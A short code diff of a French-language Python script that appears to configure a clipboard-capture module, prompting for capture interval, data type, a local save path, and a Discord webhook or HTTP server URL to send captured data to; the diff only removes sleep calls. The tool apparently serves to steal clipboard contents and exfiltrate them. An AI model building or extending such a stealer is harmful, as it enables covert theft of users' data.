@@ -72,25 +72,22 @@ def clipboard_module():
         data_type = input("Définir le type de données à capturer (texte, images) : ")
         choix["Type de données à capturer"] = data_type
         print(f"Type de données à capturer défini sur {data_type}.")
-        time.sleep(2)  
 
     def sauvegarde_locale():
         clear()
         save_local = input("Entrez le chemin de sauvegarde locale (C:/path/to/save) (pas le nom du fichier): ")
         choix["Sauvegarde locale"] = save_local
-        time.sleep(2)
 
     def envoi_discord():
         clear()
         webhook = input("Entrez l'URL du webhook discord : ")
         choix["Envoi sur Discord"] = webhook
-        time.sleep(2)
 
     def envoi_http():
         clear()
         reponse = input("Entrez l'URL de votre serveur HTTP : ")
         choix["Envoi sur serveur HTTP"] = reponse
-        time.sleep(2)
+
 
     options = [
         ("Intervalle de capture (en secondes)", intervalle_capture),
